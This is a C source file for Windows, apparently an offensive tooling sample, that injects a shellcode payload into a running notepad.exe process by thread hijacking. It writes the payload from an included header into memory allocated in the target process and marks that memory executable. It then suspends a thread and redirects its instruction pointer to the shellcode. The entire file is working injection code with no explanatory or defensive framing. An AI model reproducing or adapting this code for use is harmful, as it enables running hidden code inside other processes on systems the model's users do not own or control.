#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Payload.h"

DWORD findPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "[-] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError() );
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    DWORD pid = 0;

    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            if ( strcmp( pe32.szExeFile, procName ) == 0 ) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

    CloseHandle( hSnapshot );
    return pid;
}

DWORD findThread( DWORD pid ) {
    HANDLE hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );

    if ( hThreadSnap == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "[-] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError() );
        return 0;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof( THREADENTRY32 );
    DWORD threadId = 0;

    if ( Thread32First( hThreadSnap, &te32 ) ) {
        do {
            if ( te32.th32OwnerProcessID == pid ) {
                threadId = te32.th32ThreadID;
                break;
            }
        } while ( Thread32Next( hThreadSnap, &te32 ) );
    }

    CloseHandle( hThreadSnap );
    return threadId;
}

BOOL HijackThread( DWORD threadId, LPVOID shellcode ) {
    HANDLE hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, threadId );

    if ( hThread == NULL ) {
        fprintf( stderr, "[-] OpenThread failed. Error: %d\n", GetLastError() );
        return FALSE;
    }

    if ( SuspendThread( hThread ) == ( DWORD )-1 ) {
        fprintf( stderr, "[-] SuspendThread failed. Error: %d\n", GetLastError() );
        CloseHandle( hThread );
        return FALSE;
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if ( !GetThreadContext( hThread, &ctx ) ) {
        fprintf( stderr, "[-] GetThreadContext failed. Error: %d\n", GetLastError() );
        ResumeThread( hThread );
        CloseHandle( hThread );
        return FALSE;
    }

    ctx.Rip = ( DWORD64 )shellcode;

    if ( !SetThreadContext( hThread, &ctx ) ) {
        fprintf( stderr, "[-] SetThreadContext failed. Error: %d\n", GetLastError() );
        ResumeThread( hThread );
        CloseHandle( hThread );
        return FALSE;
    }

    ResumeThread( hThread );
    CloseHandle( hThread );
    return TRUE;
}


int main() {

    LPCSTR procName = "notepad.exe";

    DWORD pid = findPID( procName );

    if ( !pid ) {
        fprintf( stderr, "[-] Process not found.\n" );
        return 1;
    }

    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid );

    if ( hProcess == NULL ) {
        fprintf( stderr, "[-] OpenProcess failed. Error: %d\n", GetLastError() );
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx( hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( remoteBuffer == NULL ) {
        fprintf( stderr, "[-] VirtualAllocEx failed. Error: %d\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }


    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( hProcess, remoteBuffer, payload, payloadSize, &bytesWritten ) ) {
        fprintf( stderr, "[-] WriteProcessMemory failed. Error: %d\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    DWORD oldProtect;
    if ( !VirtualProtectEx( hProcess, remoteBuffer, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] VirtualProtectEx failed. Error: %d\n", GetLastError() );
        VirtualFreeEx( hProcess, remoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    DWORD threadId = findThread( pid );

    if ( !threadId ) {
        fprintf( stderr, "[-] Thread not found.\n" );
        return 1;
    }

    if ( !HijackThread( threadId, remoteBuffer ) ) {
        fprintf( stderr, "[-] Thread hijacking failed.\n" );
        VirtualFreeEx( hProcess, remoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    return 0;
}